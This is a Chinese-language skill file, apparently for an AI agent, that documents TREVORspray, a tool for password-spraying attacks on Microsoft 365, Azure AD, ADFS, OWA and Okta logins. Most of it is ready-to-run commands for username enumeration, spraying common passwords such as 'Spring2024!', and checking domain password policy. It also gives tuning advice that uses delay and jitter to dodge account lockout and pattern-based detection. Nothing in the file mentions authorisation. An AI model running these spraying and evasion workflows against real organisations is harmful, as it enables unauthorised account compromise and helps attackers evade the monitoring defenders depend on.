---
name: trevorspray
description: >
  此技能适用于用户询问关于 "trevorspray"、"对 Office 365、Azure 进行密码喷洒"、"AD 环境"、"枚举有效用户名"、"使用抖动和延迟控制进行防锁定喷洒测试"。针对 Microsoft 365、Azure AD、ADFS 及本地 Active Directory 的多线程密码喷洒工具。
---

# TREVORspray

针对 Microsoft/Azure/AD 目标的模块化多线程密码喷洒工具。

## 快速开始

```bash
# 使用单个密码对 M365 进行喷洒
trevorspray -u users.txt -p "Summer2024!" --module msol

# 通过 ADFS 对本地 AD 进行喷洒
trevorspray -u users.txt -p "Password123" --module adfs -t https://adfs.target.com

# 仅枚举有效用户名（不进行密码尝试）
trevorspray -u users.txt --module msol --enum
```

## 核心参数

| 参数 | 说明 |
|------|-------------|
| `-u <file>` | 用户名文件（或单个用户名） |
| `-p <pass>` | 喷洒使用的密码 |
| `-P <file>` | 密码列表（依次喷洒，含延迟） |
| `--module <mod>` | 目标模块 |
| `-t <url>` | 目标 URL（用于 ADFS/OWA 模块） |
| `--threads <n>` | 线程数（默认 1） |
| `--delay <s>` | 请求间延迟（秒） |
| `--jitter <s>` | 延迟随机抖动值 |
| `--lockout-delay <s>` | 疑似触发锁定后的等待时间 |
| `--enum` | 仅进行用户名枚举 |
| `-o <file>` | 输出文件 |
| `--reauth` | 延迟后重新认证（用于 Token 过期场景） |
| `--proxy <url>` | 代理 |

## 模块说明

| 模块 | 目标 |
|--------|--------|
| `msol` | Microsoft Online / Office 365 |
| `adfs` | Active Directory Federation Services |
| `owa` | Outlook Web Access |
| `lync` | Skype for Business |
| `okta` | Okta SSO |

## 常用工作流

```bash
# 安全 M365 喷洒 —— 每 30 分钟一次，避免账号锁定
trevorspray -u users.txt -p "Spring2024!" --module msol --delay 1800 --jitter 60

# 枚举有效 M365 用户（无锁定风险）
trevorspray -u users.txt --module msol --enum -o valid_users.txt

# 通过代理进行 ADFS 喷洒
trevorspray -u users.txt -p "Password1" --module adfs -t https://sts.target.com \
  --delay 60 --jitter 30 --proxy http://127.0.0.1:8080

# 多密码喷洒，使用受控延迟
trevorspray -u valid_users.txt -P passwords.txt --module msol --delay 3600
```

## 锁定策略注意事项

- 喷洒前先检查密码策略：`crackmapexec smb <dc> --pass-pol`
- 对于每小时仅允许 1 次尝试的环境，使用 `--delay 3600`
- 优先使用 `--enum` 先筛选有效用户，减少无效用户噪音
- 使用抖动防止规律性检测：`--delay 1800 --jitter 300`

## 参考资源

| 文件 | 何时加载 |
|------|--------------|
| `references/lockout-policy.md` | 锁定策略检测、安全时间计算、用户枚举技术 |
